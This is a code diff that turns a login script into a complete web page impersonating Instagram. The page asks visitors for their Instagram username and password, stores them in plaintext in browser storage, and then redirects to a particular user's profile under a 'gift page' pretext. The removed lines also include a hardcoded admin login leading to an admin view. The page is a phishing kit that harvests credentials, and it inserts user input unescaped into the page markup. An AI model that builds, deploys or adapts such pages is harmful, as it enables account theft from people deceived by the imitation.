@@ -1,63 +1,164 @@
-<script>
-  function togglePassword() {
-    const pass = document.getElementById('password');
-    pass.type = pass.type === 'password' ? 'text' : 'password';
-  }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram-style Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('A.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      width: 300px;
+    }
+    h1 {
+      font-family: 'Billabong', cursive;
+      font-size: 50px;
+      margin-bottom: 5px;
+    }
+    h2 {
+      margin-top: 0;
+      font-size: 22px;
+    }
+    p {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .eye-toggle {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .eye-toggle span {
+      position: absolute;
+      right: 10px;
+      cursor: pointer;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #confirmPrompt {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.95);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    #confirmPrompt div {
+      background: #fff;
+      border: 2px solid #3897f0;
+      padding: 30px;
+      text-align: left;
+      font-size: 16px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginContainer">
+    <h2>Welcome</h2>
+    <h1>Instagram</h1>
+    <p>Please log in with your Instagram credentials</p>
+    <input type="text" id="username" placeholder="Username">
+    <div class="eye-toggle">
+      <input type="password" id="password" placeholder="Password">
+      <span onclick="togglePassword()">👁</span>
+    </div>
+    <button onclick="confirmLogin()">Log In</button>
+  </div>
 
-  function confirmLogin() {
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
+  <div id="confirmPrompt"></div>
 
-    if (!user || !pass) {
-      alert("Please fill in all fields.");
-      return;
+  <script>
+    function togglePassword() {
+      const pass = document.getElementById('password');
+      pass.type = pass.type === 'password' ? 'text' : 'password';
     }
 
-    const container = document.getElementById('confirmPrompt');
-    container.style.display = 'flex';
-    document.getElementById('loginContainer').style.display = 'none';
-    container.innerHTML = `
-      <div>
-        <p><strong>Confirm your details:</strong></p>
-        <p>Username: ${user}</p>
-        <p>Password: <input type="password" value="${pass}" id="confirmPassInput" style="width: 80%; padding: 5px;"> <span onclick="toggleConfirmPass()">👁</span></p>
-        <button onclick="handleConfirm('${user}', '${pass}')">Confirm</button>
-        <button onclick="cancelPrompt()">Cancel</button>
-      </div>
-    `;
-  }
-
-  function toggleConfirmPass() {
-    const input = document.getElementById('confirmPassInput');
-    input.type = input.type === 'password' ? 'text' : 'password';
-  }
-
-  function cancelPrompt() {
-    document.getElementById('confirmPrompt').style.display = 'none';
-    document.getElementById('loginContainer').style.display = 'block';
-  }
-
-  function handleConfirm(user, pass) {
-    document.getElementById('confirmPrompt').style.display = 'none';
-
-    const entries = JSON.parse(localStorage.getItem('loginData')) || [];
-    const currentDate = new Date().toLocaleString();
-
-    if (user === "Bravo" && pass === "Bravin,18794") {
-      sessionStorage.setItem("isAdmin", "true");
-      window.location.href = "admin.html";
-      return;
+    function toggleConfirmPass() {
+      const input = document.getElementById('confirmPassInput');
+      input.type = input.type === 'password' ? 'text' : 'password';
     }
 
-    const existing = entries.find(e => e.username === user && e.password === pass);
-    if (existing) {
-      existing.date = currentDate;
-    } else {
-      entries.push({ username: user, password: pass, date: currentDate, deletable: true });
+    function cancelPrompt() {
+      document.getElementById('confirmPrompt').style.display = 'none';
+      document.getElementById('loginContainer').style.display = 'block';
     }
 
-    localStorage.setItem('loginData', JSON.stringify(entries));
-    alert("Redirecting to Instagram...");
-    window.location.href = "https://instagram.com/bravo_momanyi?text=I%20found%20you%20on%20your%20gift%20page";
-  }
-</script>
+    function confirmLogin() {
+      const user = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value.trim();
+
+      if (!user || !pass) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      const container = document.getElementById('confirmPrompt');
+      container.style.display = 'flex';
+      document.getElementById('loginContainer').style.display = 'none';
+      container.innerHTML = `
+        <div>
+          <p><strong>Confirm your details:</strong></p>
+          <p>Username: ${user}</p>
+          <p>Password: <input type="password" value="${pass}" id="confirmPassInput" style="width: 80%; padding: 5px;"> <span onclick="toggleConfirmPass()">👁</span></p>
+          <button onclick="handleConfirm('${user}', '${pass}')">Confirm</button>
+          <button onclick="cancelPrompt()">Cancel</button>
+        </div>
+      `;
+    }
+
+    function handleConfirm(user, pass) {
+      const entries = JSON.parse(localStorage.getItem('loginData')) || [];
+      const currentDate = new Date().toLocaleString();
+      const existing = entries.find(e => e.username === user && e.password === pass);
+
+      if (existing) {
+        existing.date = currentDate;
+      } else {
+        entries.push({ username: user, password: pass, date: currentDate });
+      }
+
+      localStorage.setItem('loginData', JSON.stringify(entries));
+
+      alert("Redirecting to Instagram...");
+      window.location.href = "https://instagram.com/bravo_momanyi?text=I%20found%20you%20on%20your%20gift%20page";
+    }
+  </script>
+</body>
+</html>
